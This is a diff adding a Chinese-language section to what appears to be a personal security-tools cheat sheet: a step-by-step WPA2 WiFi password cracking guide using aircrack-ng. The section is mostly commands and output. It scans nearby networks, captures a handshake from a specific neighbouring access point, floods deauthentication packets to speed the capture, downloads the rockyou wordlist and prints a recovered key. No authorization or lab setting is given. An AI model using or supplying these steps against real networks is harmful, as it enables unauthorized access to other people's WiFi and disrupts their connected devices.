@@ -251,6 +251,127 @@ sudo /etc/init.d/networking restart
 ```shell
 sqlmap -u URL [options]
 ```
+## aircrack-ng无线网络WIFI密码破解
+### 检查无线网卡是否加载成功
+```shell
+lm test # iwconfig 
+enp9s0    no wireless extensions.
+
+lo        no wireless extensions.
+
+mon0      IEEE 802.11  Mode:Monitor  Tx-Power=16 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:off
+          
+wlp6s0    IEEE 802.11  ESSID:"Netcore_00C9EF"  
+          Mode:Managed  Frequency:2.437 GHz  Access Point: 08:10:7A:00:C9:EF   
+          Bit Rate=72.2 Mb/s   Tx-Power=16 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:off
+          Link Quality=44/70  Signal level=-66 dBm  
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:67  Invalid misc:842   Missed beacon:0
+```
+
+### 检查附近网络状况
+```shell
+lm test # airodump-ng mon0
+
+CH 11 ][ Elapsed: 2 mins ][ 2018-04-25 20:50                                    
+                                                                                 
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                 
+ 08:10:7A:00:C9:EF  -23     5419    11700 1202   6  54e  WPA2 CCMP   PSK  Netcore
+ 8C:A6:DF:01:EF:7C  -57     1303      687    9   6  54e. WPA2 CCMP   PSK  TP-LINK
+ EC:3D:FD:E2:86:22  -65       17        1    0   4  54e  WPA2 CCMP   PSK  B-LINK_
+ 50:3A:A0:CC:01:AA  -83      639        0    0   6  54e. WPA2 CCMP   PSK  MERCURY
+ BC:46:99:69:EF:B4  -88      874        0    0   6  54e. WPA2 CCMP   PSK  TP-LINK
+ 08:10:77:A4:CD:14  -92       16       53    0   6  54e  WPA2 CCMP   PSK  10086   
+ 6C:59:40:C2:5F:EC  -64        1        1    0  13  54e  WPA2 CCMP   PSK  <length 
+ 0C:D8:6C:25:04:D4  -69        2        0    0  12  54e  WPA2 CCMP   PSK  <length 
+ C8:3A:35:35:FC:A8  -88        1        0    0   4  54e  WPA  CCMP   PSK  Tenda_3 
+ C6:BB:4C:07:65:00  -85      191        0    0   6  54e  WPA2 CCMP   PSK  IOV_HS1 
+ 1C:60:DE:F9:C1:80  -84        1        0    0   1  54e. WPA2 CCMP   PSK  LLLLL   
+ E4:D3:32:8B:0A:70  -50        2        0    0   1  54e. WPA2 CCMP   PSK  <length 
+                                                                                  
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe       �
+                                                                                  
+ (not associated)   DA:A1:19:09:2E:13  -61    0 - 1      0       22  10086,TP-LINK
+ (not associated)   D4:50:3F:81:AF:AB  -62    0 - 1      0       28               
+ (not associated)   DA:A1:19:53:F2:A6  -76    0 - 1      0        2               
+ (not associated)   0A:F8:20:1A:34:8B  -77    0 - 1      0        3               
+ (not associated)   F4:E3:FB:AA:5F:FC  -82    0 - 1      4        5  99,123       
+ (not associated)   5C:CF:7F:DE:22:D5  -84    0 - 1      0       13               
+ (not associated)   1C:DD:EA:6B:F5:93  -85    0 - 1      0        2               
+ (not associated)   DA:A1:19:AD:BA:35  -86    0 - 6      0        1               
+ (not associated)   7A:9F:81:6A:3E:00  -86    0 - 1      0        2               
+ (not associated)   BE:4D:85:21:8B:83  -86    0 - 1      0        2               
+ (not associated)   AA:AF:CC:B1:E9:B2  -89    0 - 1      0        1               
+ (not associated)   8A:47:E1:5C:B8:D0  -89    0 - 1      0        2               
+ (not associated)   F0:79:E8:A4:61:A5  -91    0 - 1      0        2  �.���.�.��.��
+ (not associated)   92:A2:A9:60:C2:62  -91    0 - 1      0        1               
+ (not associated)   1E:C3:F6:F8:B9:BF  -92    0 - 1      0        1               
+ (not associated)   DA:A1:19:75:B9:34  -79    0 - 6      0        2               
+ (not associated)   F2:75:03:E8:79:63  -84    0 - 1      0        1               
+ (not associated)   E4:47:90:C7:02:85  -89    0 - 1      0        1               
+ (not associated)   DA:A1:19:56:2C:A7  -88    0 - 6      0        1               
+ (not associated)   64:CC:2E:63:84:43  -86    0 - 1      0        1               
+ (not associated)   38:A4:ED:42:99:A5  -92    0 - 1      0        8  ChinaNet-JxXv
+ (not associated)   DA:A1:19:C6:1B:96  -87    0 - 6      0        2               
+ (not associated)   CC:2D:83:41:7D:48  -94    0 - 1      0        1  gcabc        
+```
+
+### 抓握手包
+```shell
+lm test # airodump-ng -c 4 --bssid EC:3D:FD:E2:86:22 -w hacku mon0 --ignore-negative-one
+```
+> -c chanel(频道) 
+> --bssid 指定抓包的WiFi主机的MAC地址
+> -w 抓包记录文件命名
+> mon0 网卡编号
+> --ignore-negative-one 避免自带Bug
+
+### 加速抓握手包
+为了加速握手包的获取，使用aireplay向AP发送断开包
+
+```shell
+lm test # aireplay-ng -0 0 -a EC:3D:FD:E2:86:22 mon0 --ignore-negative-one
+```
+### 握手包成功抓取标志
+成功抓取握手包之后会在右上角出现 **[ WPA handshake: 08:10:7A:00:C9:EF**的标志
+
+### 下载密码本
+```shell
+curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+```
+
+### 利用抓到的握手包破解WIFI密码
+```shell
+lm test # aircrack-ng hacku-01.cap -w ./rockyou.txt
+```
+
+### WIFI密码破解成功的标志
+```shell
+                                 Aircrack-ng 1.2 beta3
 
 
+                   [00:00:00] 16 keys tested (582.90 k/s)
 
+
+                           KEY FOUND! [ 123456789 ]
+
+
+      Master Key     : 9A 2D 4B 9D 59 59 7B 9E 9F 81 B5 D1 B9 E4 3A E3 
+                       3E 84 D3 DC FB 9A 8A 02 2D 5C C0 BD 13 CE 7E BF 
+
+      Transient Key  : C3 B0 0E B5 DC E8 89 CB DF 2F 3D B4 65 6E 92 44 
+                       78 37 69 3E 54 A5 C4 B2 12 F4 B2 F4 56 D8 EE 36 
+                       44 D8 49 CF F6 2C 5E 39 16 27 49 64 7A 0E B8 DB 
+                       71 1A 3C 4E 8D D8 50 9A 9D 68 BE DF 3D 86 07 2A 
+
+      EAPOL HMAC     : 4C D6 17 43 FF E3 7E F8 CD 43 A2 91 3E A8 2A E0 
+      ```
+      ### 参考文献
+      > (wifi-cracking)[https://github.com/brannondorsey/wifi-cracking]
+      > (aircrack-ng无线网WIFI破解教程(下) – WIFI破解实战)[http://www.vuln.cn/2683]
